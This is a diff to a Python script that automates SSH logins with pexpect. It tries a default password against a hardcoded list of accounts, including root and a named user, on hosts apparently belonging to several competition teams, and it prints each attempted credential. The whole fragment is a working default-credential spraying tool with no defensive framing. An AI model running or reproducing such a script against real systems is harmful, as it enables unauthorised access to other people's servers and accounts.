@@ -8,12 +8,11 @@ def ssh(user, host, password, timeout=2):
 	try:                                                                                                                                                                                                                                                                                                         
 		print(user)
 		ssh_cmd = f'ssh {user}@{host}'                                                                                                              
-		child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")   
-		child.log_file = open("list.log", "w")                                                                                                                         
-		child.expect(['password: '])                                                                                                                                                                                                                                                                                               
+		child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")                                                                                                                            
+		child.expect(['password: '])
+		print(f"User: {user}\tHost: {host}: Pwd: {password}")                                                                                                                                                                                                                                                                                               
 		child.sendline(password)                                                                                                                                                                                                                                                                                                     
-		child.expect(pexpect.EOF)   
-		print(f"User: {user}\tHost: {host}: Pwd: {password}")                                                                                                                                               
+		child.expect(pexpect.EOF)                                                                                                                                                  
 		child.close()
 	except:
 		return                                                                                                                                                                                                                                                                                                             
@@ -21,6 +20,7 @@ def ssh(user, host, password, timeout=2):
 
 default_passwords = ["changeme123!"]
 
+users = ["root", "Yuugo.Takagawa"]
 
 
 # each team
